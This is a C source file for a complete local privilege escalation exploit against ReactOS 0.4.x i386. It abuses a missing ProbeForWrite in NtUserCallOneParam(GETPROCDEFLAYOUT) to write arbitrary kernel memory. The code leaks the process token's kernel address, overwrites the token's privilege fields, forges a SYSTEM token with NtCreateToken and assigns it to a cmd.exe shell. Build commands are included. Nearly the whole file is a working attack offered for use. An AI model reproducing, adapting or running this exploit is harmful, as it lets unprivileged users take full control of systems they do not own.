/****************************************************************************
 *                                                                          *
 *        _._     _,-'""`-._                                                *
 *       (,-.`._,'(       |\`-/|                                            *
 *           `-.-' \ )-`( , o o)                                            *
 *                 `-    \`_`"'-                                            *
 *                                                                          *
 *   ReactOS win32ss local privilege escalation                             *
 *   NtUserCallOneParam(GETPROCDEFLAYOUT) missing ProbeForWrite             *
 *   win32ss/user/ntuser/simplecall.c:404                                   *
 *                                                                          *
 *   SetProcessDefaultLayout stores a DWORD in the kernel ppi struct.       *
 *   GetProcessDefaultLayout reads it back via NtUserCallOneParam           *
 *   with the Param as raw output pointer -- no probe, no try/except.       *
 *   Write any DWORD to any address from userland.                          *
 *                                                                          *
 *   tested on ReactOS 0.4.x i386                                           *
 *   user -> SYSTEM                                                         *
 *                                                                          *
 *   _SiCk // afflicted.sh                                                  *
 *                                                                          *
 *   build:                                                                 *
 *     i686-w64-mingw32-gcc -o win32ss-lpe.exe win32ss-lpe.c                *
 *         -luser32 -ladvapi32 -lkernel32 -lntdll -O2                       *
 *                                                                          *
 ****************************************************************************/

#include <windows.h>
#include <sddl.h>
#include <stdio.h>

#define SystemHandleInformation     16
#define STATUS_INFO_LENGTH_MISMATCH ((LONG)0xC0000004)
#define ProcessAccessToken_Class    9
#define OFF_PRIVCOUNT  0x54
#define OFF_PRIVS      0x74

typedef struct {
    ULONG Length; HANDLE RootDirectory; PVOID ObjectName;
    ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService;
} MYOA;

typedef struct {
    USHORT Pid; USHORT BackTrace; UCHAR TypeIdx; UCHAR Attr;
    USHORT Handle; PVOID Object; ULONG Access;
} HENTRY;

typedef struct { ULONG Count; HENTRY H[1]; } HINFO;
typedef struct { HANDLE Token; HANDLE Thread; } TOKINFO;

typedef LONG(NTAPI *tNtQSI)(ULONG,PVOID,ULONG,PULONG);
typedef LONG(NTAPI *tNtOPT)(HANDLE,ACCESS_MASK,PHANDLE);
typedef LONG(NTAPI *tNtSIP)(HANDLE,ULONG,PVOID,ULONG);
typedef LONG(NTAPI *tNtCT)(PHANDLE,ACCESS_MASK,MYOA*,TOKEN_TYPE,
    PLUID,PLARGE_INTEGER,PTOKEN_USER,PTOKEN_GROUPS,
    PTOKEN_PRIVILEGES,PTOKEN_OWNER,PTOKEN_PRIMARY_GROUP,
    PTOKEN_DEFAULT_DACL,PTOKEN_SOURCE);

static tNtQSI xNtQSI;
static tNtOPT xNtOPT;
static tNtSIP xNtSIP;
static tNtCT  xNtCT;

static void resolve(void)
{
    HMODULE n = GetModuleHandleA("ntdll.dll");
    xNtQSI = (tNtQSI)GetProcAddress(n,"NtQuerySystemInformation");
    xNtOPT = (tNtOPT)GetProcAddress(n,"NtOpenProcessToken");
    xNtSIP = (tNtSIP)GetProcAddress(n,"NtSetInformationProcess");
    xNtCT  = (tNtCT) GetProcAddress(n,"NtCreateToken");
}

static HINFO *dump_handles(void)
{
    ULONG sz = 0x40000; HINFO *h; LONG s;
    for(;;) {
        h = (HINFO*)VirtualAlloc(0,sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
        if(!h) return 0;
        s = xNtQSI(SystemHandleInformation,h,sz,0);
        if(s == STATUS_INFO_LENGTH_MISMATCH) {
            VirtualFree(h,0,MEM_RELEASE); sz<<=1;
            if(sz > 0x4000000) return 0;
            continue;
        }
        return s<0 ? (VirtualFree(h,0,MEM_RELEASE),(HINFO*)0) : h;
    }
}

static DWORD find_obj(HINFO *h, DWORD pid, DWORD hv)
{
    ULONG i;
    for(i=0; i<h->Count; i++)
        if(h->H[i].Pid==(USHORT)pid && h->H[i].Handle==(USHORT)hv)
            return (DWORD)(ULONG_PTR)h->H[i].Object;
    return 0;
}

static void kwrite(DWORD where, DWORD what)
{
    SetProcessDefaultLayout(what);
    GetProcessDefaultLayout((DWORD*)(ULONG_PTR)where);
}

static SID sid_sys = {1,1,{0,0,0,0,0,5},{18}};
static struct { SID s; DWORD x; } sid_adm = {{1,2,{0,0,0,0,0,5},{32}},544};
static SID sid_au  = {1,1,{0,0,0,0,0,5},{11}};
static SID sid_wd  = {1,1,{0,0,0,0,0,1},{0}};

static HANDLE forge_token(PLUID auth)
{
    HANDLE tok = 0;
    LARGE_INTEGER exp; exp.QuadPart = 0x7FFFFFFFFFFFFFFFLL;

    TOKEN_USER tu; tu.User.Sid = &sid_sys; tu.User.Attributes = 0;

    struct { DWORD n; SID_AND_ATTRIBUTES g[3]; } grp;
    grp.n = 3;
    grp.g[0].Sid = (PSID)&sid_adm;
    grp.g[0].Attributes = SE_GROUP_ENABLED|SE_GROUP_ENABLED_BY_DEFAULT|SE_GROUP_MANDATORY;
    grp.g[1].Sid = &sid_au;
    grp.g[1].Attributes = SE_GROUP_ENABLED|SE_GROUP_ENABLED_BY_DEFAULT|SE_GROUP_MANDATORY;
    grp.g[2].Sid = &sid_wd;
    grp.g[2].Attributes = SE_GROUP_ENABLED|SE_GROUP_ENABLED_BY_DEFAULT|SE_GROUP_MANDATORY;

    static const DWORD pl[] = {2,3,5,7,8,9,10,11,12,13,14,15,17,18,19,20,22,23,24,25,28,29};
    int np = sizeof(pl)/sizeof(pl[0]), i;

    BYTE pb[sizeof(DWORD)+22*sizeof(LUID_AND_ATTRIBUTES)];
    TOKEN_PRIVILEGES *tp = (TOKEN_PRIVILEGES*)pb;
    tp->PrivilegeCount = np;
    for(i=0;i<np;i++) {
        tp->Privileges[i].Luid.LowPart = pl[i];
        tp->Privileges[i].Luid.HighPart = 0;
        tp->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED|SE_PRIVILEGE_ENABLED_BY_DEFAULT;
    }

    TOKEN_OWNER to; to.Owner = &sid_sys;
    TOKEN_PRIMARY_GROUP tpg; tpg.PrimaryGroup = &sid_sys;

    BYTE db[256]; PACL dacl = (PACL)db;
    InitializeAcl(dacl,256,ACL_REVISION);
    AddAccessAllowedAce(dacl,ACL_REVISION,GENERIC_ALL,&sid_sys);
    AddAccessAllowedAce(dacl,ACL_REVISION,GENERIC_ALL,(PSID)&sid_adm);
    TOKEN_DEFAULT_DACL tdd; tdd.DefaultDacl = dacl;

    TOKEN_SOURCE ts;
    memcpy(ts.SourceName,"SiCk\0\0\0\0",TOKEN_SOURCE_LENGTH);
    AllocateLocallyUniqueId(&ts.SourceIdentifier);

    SECURITY_QUALITY_OF_SERVICE sq;
    sq.Length = sizeof(sq); sq.ImpersonationLevel = SecurityAnonymous;
    sq.ContextTrackingMode = SECURITY_STATIC_TRACKING; sq.EffectiveOnly = FALSE;

    MYOA oa; memset(&oa,0,sizeof(oa));
    oa.Length = sizeof(oa); oa.SecurityQualityOfService = &sq;

    LONG st = xNtCT(&tok,TOKEN_ALL_ACCESS,&oa,TokenPrimary,auth,&exp,
        &tu,(PTOKEN_GROUPS)&grp,tp,&to,&tpg,&tdd,&ts);

    if(st<0) return 0;
    return tok;
}

static void banner(void)
{
    printf("\n");
    printf("    _._     _,-'\"\"\"``-._\n");
    printf("   (,-.`._,'(       |\\`-/|\n");
    printf("       `-.-' \\ )-`( , o o)\n");
    printf("             `-    \\`_`\"'-\n");
    printf("\n");
    printf("   GETPROCDEFLAYOUT LPE\n");
    printf("   ReactOS i386 - user to SYSTEM\n");
    printf("   _SiCk // afflicted.sh\n");
    printf("\n");
}

int main(void)
{
    DWORD pid, ka; LONG s;
    HANDLE htok, sys, ctok;
    HINFO *hi;
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    TOKINFO ti;
    BYTE buf[256]; DWORD len;
    LPSTR ss;

    setvbuf(stdout,0,_IONBF,0);
    banner();

    resolve();
    if(!xNtQSI||!xNtOPT||!xNtSIP||!xNtCT) { printf("[!] ntdll\n"); return 1; }

    pid = GetCurrentProcessId();

    ZeroMemory(&si,sizeof(si)); si.cb=sizeof(si);
    ZeroMemory(&pi,sizeof(pi));
    if(!CreateProcessA("C:\\ReactOS\\system32\\cmd.exe",0,0,0,0,
        CREATE_SUSPENDED|CREATE_NEW_CONSOLE,0,"C:\\",&si,&pi))
    { printf("[!] CreateProcess: %lu\n",GetLastError()); return 1; }
    printf("[*] child %lu\n",pi.dwProcessId);

    s = xNtOPT((HANDLE)-1,TOKEN_ALL_ACCESS,&htok);
    if(s<0) { printf("[!] %08lX\n",(DWORD)s); return 1; }

    LUID auth = {0,0};
    if(GetTokenInformation(htok,TokenStatistics,buf,sizeof(buf),&len))
        auth = ((TOKEN_STATISTICS*)buf)->AuthenticationId;

    if(GetTokenInformation(htok,TokenUser,buf,sizeof(buf),&len)) {
        ConvertSidToStringSidA(((TOKEN_USER*)buf)->User.Sid,&ss);
        printf("[*] %s\n",ss?ss:"?"); if(ss) LocalFree(ss);
    }

    hi = dump_handles();
    if(!hi) { printf("[!] handles\n"); return 1; }
    ka = find_obj(hi,pid,(DWORD)(ULONG_PTR)htok);
    VirtualFree(hi,0,MEM_RELEASE);
    if(!ka) { printf("[!] token\n"); return 1; }
    printf("[+] TOKEN %08lX\n",ka);

    BYTE *pg = (BYTE*)VirtualAlloc(0,4096,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    LUID_AND_ATTRIBUTES *fp = (LUID_AND_ATTRIBUTES*)(pg+1);
    static const DWORD L[] = {2,3,5,7,8,9,10,11,12,13,14,15,17,18,19,20,22,23,24,25,28,29};
    int n = sizeof(L)/sizeof(L[0]), i;
    for(i=0;i<n;i++) {
        fp[i].Luid.LowPart=L[i]; fp[i].Luid.HighPart=0;
        fp[i].Attributes = SE_PRIVILEGE_ENABLED|SE_PRIVILEGE_ENABLED_BY_DEFAULT;
    }
    kwrite(ka+OFF_PRIVS, (DWORD)(ULONG_PTR)fp);
    kwrite(ka+OFF_PRIVCOUNT, (DWORD)n);
    printf("[+] privs\n");

    sys = forge_token(&auth);
    if(!sys) { ResumeThread(pi.hThread); return 1; }
    printf("[+] token\n");

    ti.Token = sys; ti.Thread = 0;
    s = xNtSIP(pi.hProcess,ProcessAccessToken_Class,&ti,sizeof(ti));
    if(s<0) { printf("[!] swap %08lX\n",(DWORD)s); ResumeThread(pi.hThread); return 1; }

    ResumeThread(pi.hThread);
    Sleep(500);

    s = xNtOPT(pi.hProcess,TOKEN_QUERY,&ctok);
    if(s>=0) {
        if(GetTokenInformation(ctok,TokenUser,buf,sizeof(buf),&len)) {
            ConvertSidToStringSidA(((TOKEN_USER*)buf)->User.Sid,&ss);
            if(ss && !strcmp(ss,"S-1-5-18"))
                printf("[+] SYSTEM %lu\n",pi.dwProcessId);
            else
                printf("[!] %s\n",ss?ss:"?");
            if(ss) LocalFree(ss);
        }
        CloseHandle(ctok);
    }

    printf("[*] done\n");
    getchar();

    CloseHandle(sys); CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread); CloseHandle(htok);
    return 0;
}
